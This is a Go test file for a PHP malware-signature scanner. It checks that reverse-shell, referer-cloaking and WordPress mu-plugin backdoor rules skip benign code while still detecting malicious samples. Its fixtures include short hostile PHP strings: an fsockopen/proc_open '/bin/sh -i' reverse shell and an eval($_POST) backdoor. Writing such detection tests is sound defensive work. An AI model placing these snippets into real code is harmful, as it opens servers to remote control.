package signatures

import "testing"

// YAML-engine mirror of the context-arm FP-flood fixes. The YAML engine's
// file_types already shield php_goto (.cpp) and exploit_symlink (.ts). The
// .php false positives that remain: revshell_pentestmonkey counted two
// fsockopen signals on a MailChimp HTTP client, spam_cloaking_referer matched
// a security ruleset, and backdoor_wp_muplugin read doubleval() as eval.

func TestFPFlood_YML_RevshellPentestmonkey_MailchimpClient(t *testing.T) {
	s := loadRepoScanner(t)
	legit := []byte("<?php class MCAPI { function callServer(){ $sock = fsockopen($this->host, 80); fwrite($sock, $payload); } }")
	if hasRule(s.ScanContent(legit, ".php"), "revshell_pentestmonkey") {
		t.Error("revshell_pentestmonkey FP: matched a MailChimp API HTTP client")
	}
	mal := []byte("<?php $sock=fsockopen($ip,$port); $proc=proc_open('/bin/sh -i', $d, $p);")
	if !hasRule(s.ScanContent(mal, ".php"), "revshell_pentestmonkey") {
		t.Error("revshell_pentestmonkey regression: real reverse shell not detected")
	}
}

func TestFPFlood_YML_SpamCloakingReferer_SecurityRuleset(t *testing.T) {
	s := loadRepoScanner(t)
	legit := []byte("<?php $patterns = array('HTTP_REFERER' => 'google.*bing'); $conf .= \"referer google include block\";")
	if hasRule(s.ScanContent(legit, ".php"), "spam_cloaking_referer") {
		t.Error("spam_cloaking_referer FP: matched a security ruleset / config comment")
	}
	mal := []byte("<?php if (strpos($_SERVER['HTTP_REFERER'],'google')!==false){ include 'spam.html'; }")
	if !hasRule(s.ScanContent(mal, ".php"), "spam_cloaking_referer") {
		t.Error("spam_cloaking_referer regression: real referer cloaker not detected")
	}
}

func TestFPFlood_YML_BackdoorWpMuplugin_Doubleval(t *testing.T) {
	s := loadRepoScanner(t)
	legit := []byte("<?php // mu-plugins loader\n$v = doubleval($_GET['beds']);")
	if hasRule(s.ScanContent(legit, ".php"), "backdoor_wp_muplugin") {
		t.Error("backdoor_wp_muplugin FP: doubleval() read as eval")
	}
	mal := []byte("<?php // wp-content/mu-plugins/x.php\neval($_POST['x']);")
	if !hasRule(s.ScanContent(mal, ".php"), "backdoor_wp_muplugin") {
		t.Error("backdoor_wp_muplugin regression: real mu-plugin backdoor not detected")
	}
}
